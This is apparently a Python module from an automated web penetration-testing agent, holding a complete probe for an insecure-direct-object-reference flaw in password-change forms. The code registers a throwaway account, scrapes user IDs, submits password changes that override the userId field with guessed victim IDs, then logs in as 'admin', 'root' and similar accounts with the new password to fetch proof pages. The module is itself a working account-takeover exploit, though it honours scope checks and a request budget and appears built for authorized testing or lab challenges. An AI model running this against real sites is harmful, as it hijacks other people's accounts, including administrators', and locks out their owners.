from __future__ import annotations

import json
import re
import secrets
from dataclasses import dataclass
from typing import cast
from urllib.parse import urljoin, urlsplit

from ravage.agent_core.agent_state import AgentState
from ravage.agent_core.observation_analysis import extract_signals
from ravage.probes.specialists.shared import (
    _dedupe,
    _signal_endpoints,
    _surface_endpoints,
)
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, response_secrets
from ravage.web_core.proof_recognizer import recognize_proofs

_REGISTER_PATHS = (
    "/api/register.php",
    "/register.php",
    "/api/register",
    "/register",
    "/signup.php",
    "/signup",
)

_LOGIN_PATHS = (
    "/api/login.php",
    "/login.php",
    "/api/login",
    "/login",
    "/signin.php",
    "/signin",
)

_PROFILE_PATHS = (
    "/profile.php",
    "/profile",
    "/account.php",
    "/account",
    "/dashboard.php",
    "/dashboard",
    "/settings.php",
    "/settings",
)

_PASSWORD_CHANGE_PATHS = (
    "/change_password.php",
    "/api/update_password.php",
    "/update_password.php",
    "/api/password.php",
    "/password.php",
    "/profile.php",
)

_ADMIN_USERNAMES = (
    "admin",
    "administrator",
    "root",
    "manager",
    "owner",
)

_LOW_PRIVILEGE_ID_CANDIDATES = (
    "7",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "8",
    "9",
    "10",
)

_AJAX_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest",
}


@dataclass(frozen=True)
class _PasswordIdentity:
    username: str
    email: str
    password: str
    replacement_password: str


@dataclass
class _PasswordProbeRun:
    findings: list[dict[str, object]]
    requests: list[dict[str, object]]
    budget: int


def _probe_password_change_idor(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    if budget <= 0 or not _state_suggests_password_idor(state):
        return [], [], budget

    register_urls = _candidate_auth_urls(session, state, markers=("register", "signup"), defaults=_REGISTER_PATHS)
    login_urls = _candidate_auth_urls(session, state, markers=("login", "signin"), defaults=_LOGIN_PATHS)
    if not register_urls or not login_urls:
        return [], [], budget

    run = _PasswordProbeRun(findings=[], requests=[], budget=budget)
    identity = _new_password_identity()

    for register_url in register_urls[:4]:
        if run.budget <= 0:
            break
        if _try_registered_identity(
            session,
            state,
            identity,
            register_url=register_url,
            login_urls=login_urls[:4],
            run=run,
        ):
            break

    return run.findings, run.requests, run.budget


def _state_suggests_password_idor(state: AgentState) -> bool:
    text = _state_text(state)
    idor_like = _contains_any(
        text,
        (
            "idor",
            "insecure direct object",
            "authorization",
            "user_id",
            "userid",
            "account_id",
            "profile",
        ),
    )
    password_like = _contains_any(
        text,
        (
            "password",
            "change_password",
            "update_password",
            "oldpassword",
            "newpassword",
            "confirmpassword",
        ),
    )
    return idor_like and password_like


def _try_registered_identity(
    session: ProbeSession,
    state: AgentState,
    identity: _PasswordIdentity,
    *,
    register_url: str,
    login_urls: list[str],
    run: _PasswordProbeRun,
) -> bool:
    probe_session = _fork_session(session)
    register_response = _register_identity(probe_session, register_url, identity)
    run.budget -= 1
    run.requests.append(_auth_request(register_response, "idor_password_register", register_url))

    if not _response_looks_successful(register_response):
        return False

    for login_url in login_urls:
        if run.budget <= 0:
            return False
        if _try_password_change_after_login(
            probe_session,
            state,
            identity,
            login_url=login_url,
            register_url=register_url,
            run=run,
        ):
            return True
    return False


def _try_password_change_after_login(
    session: ProbeSession,
    state: AgentState,
    identity: _PasswordIdentity,
    *,
    login_url: str,
    register_url: str,
    run: _PasswordProbeRun,
) -> bool:
    login_response = _login_identity(session, login_url, identity.username, identity.password)
    run.budget -= 1
    run.requests.append(_auth_request(login_response, "idor_password_login", login_url))

    if not _response_looks_successful(login_response):
        return False

    profile_pages = _fetch_profile_pages(session, state, run)
    profile_bodies = [response.body for response in profile_pages]
    request_templates = _combined_request_templates(
        state,
        _request_templates_from_bodies(profile_bodies),
    )
    change_urls = _password_change_urls_from_state_and_pages(
        session,
        state,
        profile_pages,
        request_templates=request_templates,
    )
    candidate_ids = _candidate_victim_user_ids(
        profile_bodies,
        state,
        request_templates=request_templates,
    )
    field_hints = _password_change_field_hints(state, request_templates=request_templates)

    for change_url in change_urls[:8]:
        for candidate_id in candidate_ids:
            if run.budget <= 0:
                return False
            changed = _try_change_candidate_password(
                session,
                identity,
                change_url=change_url,
                candidate_id=candidate_id,
                field_hints=field_hints,
                run=run,
            )
            if not changed:
                continue
            if _verify_admin_login_after_password_change(
                session,
                state,
                identity,
                login_url=login_url,
                change_url=change_url,
                register_url=register_url,
                candidate_id=candidate_id,
                field_hints=field_hints,
                run=run,
            ):
                return True
    return False


def _register_identity(
    session: ProbeSession,
    register_url: str,
    identity: _PasswordIdentity,
) -> ProbeResponse:
    fields = {
        "username": identity.username,
        "user": identity.username,
        "email": identity.email,
        "password": identity.password,
        "confirmPassword": identity.password,
        "password_confirm": identity.password,
    }
    return session.post_form(register_url, fields, headers=_AJAX_HEADERS)


def _login_identity(
    session: ProbeSession,
    login_url: str,
    username: str,
    password: str,
) -> ProbeResponse:
    fields = {
        "username": username,
        "user": username,
        "email": username,
        "password": password,
    }
    if "@" not in username:
        fields["email"] = f"{username}@example.test"
    return session.post_form(login_url, fields, headers=_AJAX_HEADERS)


def _try_change_candidate_password(
    session: ProbeSession,
    identity: _PasswordIdentity,
    *,
    change_url: str,
    candidate_id: str,
    field_hints: dict[str, str],
    run: _PasswordProbeRun,
) -> bool:
    fields = _password_change_fields(identity, candidate_id, field_hints=field_hints)
    response = session.post_form(change_url, fields, headers=_AJAX_HEADERS)
    run.budget -= 1
    run.requests.append(
        response.summary(body_chars=260)
        | {
            "probe_kind": "idor_password_change_candidate",
            "url": change_url,
            "candidate_user_id": candidate_id,
        }
    )
    return _response_looks_successful(response)


def _verify_admin_login_after_password_change(
    session: ProbeSession,
    state: AgentState,
    identity: _PasswordIdentity,
    *,
    login_url: str,
    change_url: str,
    register_url: str,
    candidate_id: str,
    field_hints: dict[str, str],
    run: _PasswordProbeRun,
) -> bool:
    for admin_username in _ADMIN_USERNAMES:
        if run.budget <= 0:
            return False
        admin_session = _fork_session(session)
        login_response = _login_identity(
            admin_session,
            login_url,
            admin_username,
            identity.replacement_password,
        )
        run.budget -= 1
        run.requests.append(
            _auth_request(login_response, "idor_password_admin_login", login_url)
            | {"admin_username": admin_username, "candidate_user_id": candidate_id}
        )
        if not _response_looks_successful(login_response):
            continue
        if _fetch_admin_proof(
            admin_session,
            state,
            identity,
            login_url=login_url,
            change_url=change_url,
            register_url=register_url,
            admin_username=admin_username,
            candidate_id=candidate_id,
            field_hints=field_hints,
            run=run,
        ):
            return True
    return False


def _fetch_admin_proof(
    session: ProbeSession,
    state: AgentState,
    identity: _PasswordIdentity,
    *,
    login_url: str,
    change_url: str,
    register_url: str,
    admin_username: str,
    candidate_id: str,
    field_hints: dict[str, str],
    run: _PasswordProbeRun,
) -> bool:
    for url in _profile_urls(session, state)[:8]:
        if run.budget <= 0:
            return False
        response = session.get(url)
        run.budget -= 1
        run.requests.append(
            response.summary(body_chars=520)
            | {
                "probe_kind": "idor_password_admin_followup",
                "url": url,
                "admin_username": admin_username,
                "candidate_user_id": candidate_id,
            }
        )
        proofs = recognize_proofs(response.body)
        matches = response_secrets(response)
        if not proofs and not matches:
            continue
        run.findings.append(
            _password_change_idor_finding(
                response,
                identity,
                login_url=login_url,
                change_url=change_url,
                register_url=register_url,
                admin_username=admin_username,
                candidate_id=candidate_id,
                field_hints=field_hints,
                proofs=proofs,
                matches=matches,
            )
        )
        return bool(proofs)
    return False


def _password_change_idor_finding(
    response: ProbeResponse,
    identity: _PasswordIdentity,
    *,
    login_url: str,
    change_url: str,
    register_url: str,
    admin_username: str,
    candidate_id: str,
    field_hints: dict[str, str],
    proofs: list[str],
    matches: list[str],
) -> dict[str, object]:
    return {
        "type": "idor_password_change_exposed_secret",
        "channel": "authenticated_password_change",
        "register_url": register_url,
        "login_url": login_url,
        "change_url": change_url,
        "changed_user_id": candidate_id,
        "admin_username": admin_username,
        "low_privilege_username": identity.username,
        "proofs": proofs,
        "matches": matches[:10],
        "response": response.summary(body_chars=760),
        "replay": {
            "method": "POST",
            "url": change_url,
            "payload_field": _password_change_payload_field(field_hints),
            "form": _password_change_fields(identity, candidate_id, field_hints=field_hints),
            "encoding": "application/x-www-form-urlencoded",
            "headers": dict(_AJAX_HEADERS),
        },
        "next": (
            "A low-privilege session changed another user's password by overriding "
            "the submitted userId; reuse the changed password to log in as the "
            "privileged account and fetch the profile/dashboard proof page."
        ),
    }


def _fetch_profile_pages(
    session: ProbeSession,
    state: AgentState,
    run: _PasswordProbeRun,
) -> list[ProbeResponse]:
    responses: list[ProbeResponse] = []
    for url in _profile_urls(session, state)[:8]:
        if run.budget <= 0:
            break
        response = session.get(url)
        run.budget -= 1
        run.requests.append(
            response.summary(body_chars=420)
            | {
                "probe_kind": "idor_password_profile_fetch",
                "url": url,
            }
        )
        if response.status is not None and response.status < 500:
            responses.append(response)
    return responses


def _candidate_auth_urls(
    session: ProbeSession,
    state: AgentState,
    *,
    markers: tuple[str, ...],
    defaults: tuple[str, ...],
) -> list[str]:
    urls: list[str] = []
    for path in defaults:
        urls.append(session.absolute(path))
    for endpoint in _state_endpoint_urls(state):
        lowered = endpoint.lower()
        if any(marker in lowered for marker in markers):
            urls.append(endpoint)
    scoped = _in_scope_urls(session, urls)
    scoped.sort(key=_auth_url_sort_key)
    return scoped


def _auth_url_sort_key(url: str) -> tuple[int, str]:
    path = urlsplit(url).path.lower()
    score = 0
    if "/api/" in path:
        score -= 30
    if path.endswith(".php"):
        score -= 5
    return score, url


def _password_change_urls_from_state_and_pages(
    session: ProbeSession,
    state: AgentState,
    pages: list[ProbeResponse],
    *,
    request_templates: list[dict[str, object]] | None = None,
) -> list[str]:
    urls: list[str] = []
    for template in _combined_request_templates(state, request_templates or []):
        if not _request_template_looks_password_change(template):
            continue
        url = str(template.get("url") or "")
        if url:
            urls.append(url)
    for endpoint in _state_endpoint_urls(state):
        if _url_looks_password_change(endpoint):
            urls.append(endpoint)
    for page in pages:
        urls.extend(_password_change_urls_from_body(page.body, base_url=page.final_url or page.url))
    for path in _PASSWORD_CHANGE_PATHS:
        urls.append(session.absolute(path))
    return _in_scope_urls(session, urls)


def _profile_urls(session: ProbeSession, state: AgentState) -> list[str]:
    urls: list[str] = []
    for endpoint in _state_endpoint_urls(state):
        if _url_looks_profile(endpoint):
            urls.append(endpoint)
    for path in _PROFILE_PATHS:
        urls.append(session.absolute(path))
    return _in_scope_urls(session, urls)


def _state_endpoint_urls(state: AgentState) -> list[str]:
    urls: list[str] = []
    urls.extend(_surface_endpoints(state))
    urls.extend(_signal_endpoints(state))
    return _dedupe(urls)


def _password_change_urls_from_body(body: str, *, base_url: str) -> list[str]:
    urls: list[str] = []
    patterns = (
        r"""(?is)\burl\s*:\s*['"]([^'"]*(?:password|change)[^'"]*)['"]""",
        r"""(?is)\b(?:fetch|open)\s*\(\s*['"]([^'"]*(?:password|change)[^'"]*)['"]""",
        r"""(?is)\b(?:href|action)\s*=\s*['"]([^'"]*(?:password|change)[^'"]*)['"]""",
        r"""(?is)['"]([^'"]*(?:change_password|update_password|password)[^'"]*)['"]""",
    )
    for pattern in patterns:
        for match in re.finditer(pattern, body):
            url = urljoin(base_url, match.group(1).strip())
            urls.append(url)
    return urls


def _candidate_victim_user_ids(
    profile_bodies: list[str],
    state: AgentState,
    *,
    request_templates: list[dict[str, object]] | None = None,
) -> list[str]:
    discovered: list[str] = []
    for body in profile_bodies:
        discovered.extend(_user_ids_from_body(body))
    templates = _combined_request_templates(state, request_templates or [])
    discovered.extend(_user_ids_from_request_templates(templates))

    candidates: list[str] = list(_LOW_PRIVILEGE_ID_CANDIDATES)
    for value in discovered:
        candidates.extend(_nearby_numeric_ids(value))

    current_ids = set(discovered)
    return [candidate for candidate in _dedupe(candidates) if candidate not in current_ids][:18]


def _user_ids_from_body(body: str) -> list[str]:
    values: list[str] = []
    patterns = (
        r"""(?i)\buserId\s*[:=]\s*['"]?(\d+)""",
        r"""(?i)\buser_id\s*[:=]\s*['"]?(\d+)""",
        r"""(?i)\bname\s*=\s*['"]userId['"][^>]*\bvalue\s*=\s*['"](\d+)['"]""",
        r"""(?i)[?&]userId=(\d+)""",
        r"""(?i)[?&]user_id=(\d+)""",
    )
    for pattern in patterns:
        for match in re.finditer(pattern, body):
            values.append(match.group(1))
    return _dedupe(values)


def _user_ids_from_request_templates(request_templates: list[dict[str, object]]) -> list[str]:
    values: list[str] = []
    for template in request_templates:
        if not _request_template_looks_password_change(template):
            continue
        for name, value in _request_template_fields(template).items():
            if _password_change_field_kind(name) != "target_id":
                continue
            if value.isdigit():
                values.append(value)
    return _dedupe(values)


def _nearby_numeric_ids(value: str) -> list[str]:
    if not value.isdigit():
        return []
    current = int(value)
    nearby: list[str] = []
    for candidate in range(max(1, current - 5), current + 6):
        nearby.append(str(candidate))
    return nearby


def _password_change_fields(
    identity: _PasswordIdentity,
    candidate_id: str,
    *,
    field_hints: dict[str, str] | None = None,
) -> dict[str, str]:
    fields = {
        "oldPassword": identity.password,
        "old_password": identity.password,
        "currentPassword": identity.password,
        "current_password": identity.password,
        "newPassword": identity.replacement_password,
        "new_password": identity.replacement_password,
        "password": identity.replacement_password,
        "confirmPassword": identity.replacement_password,
        "confirm_password": identity.replacement_password,
        "password_confirm": identity.replacement_password,
        "userId": candidate_id,
        "user_id": candidate_id,
        "id": candidate_id,
    }
    for name, kind in (field_hints or {}).items():
        if kind == "old_password":
            fields[name] = identity.password
        elif kind == "new_password":
            fields[name] = identity.replacement_password
        elif kind == "target_id":
            fields[name] = candidate_id
    return fields


def _password_change_field_hints(
    state: AgentState,
    *,
    request_templates: list[dict[str, object]] | None = None,
) -> dict[str, str]:
    hints: dict[str, str] = {}
    for template in _combined_request_templates(state, request_templates or []):
        if not _request_template_looks_password_change(template):
            continue
        for name in _request_template_fields(template):
            kind = _password_change_field_kind(name)
            if kind:
                hints[name] = kind
    return hints


def _password_change_payload_field(field_hints: dict[str, str]) -> str:
    for name, kind in field_hints.items():
        if kind == "target_id":
            return name
    return "userId"


def _password_change_field_kind(name: str) -> str:
    lowered = name.lower()
    compact = re.sub(r"[^a-z0-9]", "", lowered)
    if _field_name_looks_target_id(lowered, compact):
        return "target_id"
    if "pass" not in compact:
        return ""
    if "old" in compact or "current" in compact:
        return "old_password"
    return "new_password"


def _field_name_looks_target_id(lowered: str, compact: str) -> bool:
    if lowered in {"id", "user", "uid"}:
        return True
    if compact in {"id", "userid", "useridx", "accountid", "profileid", "memberid"}:
        return True
    if not compact.endswith("id"):
        return False
    return _contains_any(compact, ("user", "account", "profile", "member", "owner"))


def _request_template_looks_password_change(template: dict[str, object]) -> bool:
    fields = _request_template_fields(template)
    parts = [str(template.get("url") or "")]
    parts.extend(fields)
    text = " ".join(parts).lower()
    password_like = _contains_any(text, ("password", "oldpass", "newpass", "confirmpass"))
    id_like = _contains_any(
        text,
        (
            "userid",
            "user_id",
            "accountid",
            "account_id",
            "profileid",
            "profile_id",
            "memberid",
            "member_id",
            "ownerid",
            "owner_id",
            " uid",
            " id",
        ),
    )
    return password_like and id_like


def _state_request_templates(state: AgentState) -> list[dict[str, object]]:
    raw_templates = state.signals.get("request_templates", [])
    return _request_templates_from_values(raw_templates)


def _request_templates_from_bodies(bodies: list[str]) -> list[dict[str, object]]:
    templates: list[dict[str, object]] = []
    for body in bodies:
        signals = extract_signals(body)
        templates.extend(_request_templates_from_values(signals.get("request_templates", [])))
    return _dedupe_request_templates(templates)


def _combined_request_templates(
    state: AgentState,
    request_templates: list[dict[str, object]],
) -> list[dict[str, object]]:
    combined: list[dict[str, object]] = []
    combined.extend(request_templates)
    combined.extend(_state_request_templates(state))
    return _dedupe_request_templates(combined)


def _request_templates_from_values(raw_templates: object) -> list[dict[str, object]]:
    if not isinstance(raw_templates, list):
        return []

    templates: list[dict[str, object]] = []
    for raw_template in raw_templates:
        try:
            parsed = json.loads(str(raw_template))
        except (TypeError, ValueError):
            continue
        if isinstance(parsed, dict):
            templates.append(dict(parsed))
    return templates[:20]


def _dedupe_request_templates(templates: list[dict[str, object]]) -> list[dict[str, object]]:
    seen: set[str] = set()
    deduped: list[dict[str, object]] = []
    for template in templates:
        key = json.dumps(template, sort_keys=True)
        if key in seen:
            continue
        seen.add(key)
        deduped.append(template)
    return deduped[:20]


def _request_template_fields(template: dict[str, object]) -> dict[str, str]:
    raw_fields = template.get("fields")
    if not isinstance(raw_fields, dict):
        return {}

    fields: dict[str, str] = {}
    for name, value in raw_fields.items():
        text_name = str(name).strip()
        if not text_name:
            continue
        fields[text_name] = str(value).strip()
    return fields


def _new_password_identity() -> _PasswordIdentity:
    suffix = secrets.token_hex(4)
    username = f"ravage_{suffix}"
    return _PasswordIdentity(
        username=username,
        email=f"{username}@example.test",
        password=f"RvOld!{suffix}9",
        replacement_password=f"RvNew!{suffix}9",
    )


def _fork_session(session: ProbeSession) -> ProbeSession:
    fork = getattr(session, "fork", None)
    if callable(fork):
        try:
            candidate = fork(timeout_seconds=getattr(session, "timeout_seconds", None))
        except TypeError:
            candidate = fork()
        return cast(ProbeSession, candidate)
    return session


def _auth_request(response: ProbeResponse, probe_kind: str, url: str) -> dict[str, object]:
    return response.summary(body_chars=220) | {
        "probe_kind": probe_kind,
        "url": url,
    }


def _response_looks_successful(response: ProbeResponse) -> bool:
    if response.status is None or response.status >= 500:
        return False
    lowered = response.body.lower()
    parsed = _json_object(response.body)
    if parsed:
        if parsed.get("success") is False or parsed.get("ok") is False:
            return False
        if parsed.get("success") is True or parsed.get("ok") is True:
            return True
    if _looks_auth_form_page(lowered):
        return False
    if "invalid" in lowered or "incorrect" in lowered or "failed" in lowered:
        return False
    if response.status in {200, 201, 202, 204, 302, 303}:
        return _contains_any(
            lowered,
            (
                "registration successful",
                "login successful",
                "password changed",
                "changed successfully",
                "logged in",
                "dashboard",
                "profile",
                "welcome",
            ),
        )
    return False


def _looks_auth_form_page(lowered_body: str) -> bool:
    if "<title>login" in lowered_body or "<title>register" in lowered_body:
        return True
    has_password_field = 'name="password"' in lowered_body or "name='password'" in lowered_body
    if not has_password_field:
        return False
    return "login" in lowered_body or "register" in lowered_body or "sign up" in lowered_body


def _json_object(text: str) -> dict[str, object]:
    try:
        parsed = json.loads(text)
    except (TypeError, ValueError):
        return {}
    if isinstance(parsed, dict):
        return dict(parsed)
    return {}


def _in_scope_urls(session: ProbeSession, urls: list[str]) -> list[str]:
    scoped: list[str] = []
    for url in urls:
        absolute = session.absolute(url)
        if session.in_scope(absolute):
            scoped.append(absolute)
    return _dedupe(scoped)


def _url_looks_password_change(url: str) -> bool:
    lowered = url.lower()
    return _contains_any(lowered, ("change_password", "update_password", "password"))


def _url_looks_profile(url: str) -> bool:
    path = urlsplit(url).path.lower()
    return _contains_any(path, ("profile", "account", "dashboard", "settings"))


def _state_text(state: AgentState) -> str:
    parts: list[str] = []
    parts.extend(state.facts[-30:])
    parts.extend(state.hypotheses[-20:])
    parts.append(str(state.surface))
    for values in state.signals.values():
        for value in values[-30:]:
            parts.append(str(value))
    return " ".join(parts).lower()


def _contains_any(text: str, markers: tuple[str, ...]) -> bool:
    for marker in markers:
        if marker in text:
            return True
    return False
